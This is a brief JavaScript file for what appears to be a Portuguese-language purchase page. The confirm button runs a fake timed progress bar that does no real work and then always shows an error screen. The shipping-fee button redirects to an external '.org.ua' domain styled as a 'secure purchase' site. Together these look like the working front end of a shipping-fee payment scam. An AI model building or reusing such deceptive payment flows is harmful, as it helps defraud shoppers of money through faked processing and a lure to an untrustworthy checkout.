document.querySelector('.btn-confirmar').addEventListener('click', function () {
  const overlay = document.getElementById('overlay')
  const fill = document.getElementById('progressFill')
  const label = document.getElementById('progressLabel')

  overlay.classList.add('active')

  const steps = [15, 35, 58, 74, 89, 100]
  const delays = [300, 600, 900, 1300, 1700, 2200]

  steps.forEach((val, i) => {
    setTimeout(() => {
      fill.style.width = val + '%'
      label.textContent = val + '%'
    }, delays[i])
  })

  setTimeout(() => {
    overlay.classList.remove('active')
    document.getElementById('page1wrap').style.display = 'none'
    const err = document.getElementById('errorScreen')
    err.style.display = 'block'
    err.style.animation = 'slide-up 0.35s cubic-bezier(.22,.68,0,1.2) both'
  }, 2800)
})

document.querySelector('.btn-frete').addEventListener('click', function () {
  window.location.href = 'https://compraonlinesegurada.org.ua/c/bfcad3208c'
})
